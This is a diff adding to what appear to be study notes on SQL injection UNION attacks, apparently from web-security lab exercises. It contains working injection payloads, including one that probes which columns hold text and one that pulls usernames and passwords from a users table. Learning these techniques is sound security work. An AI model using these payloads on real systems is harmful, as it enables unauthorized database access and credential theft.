@@ -173,3 +173,17 @@ We've gone over this already many times
 ' UNION SELECT 'abc',NULL--
 ' UNION SELECT NULL,'abc'--
 ```
+
+### SQL injection UNION attack, retrieving data from other tables
+
+Checking same UNION and columns holding text methodology
+
+```
+' UNION SELECT 'abc','abc'--
+```
+
+Pull data out
+
+```
+' UNION SELECT username, password from users--
+```
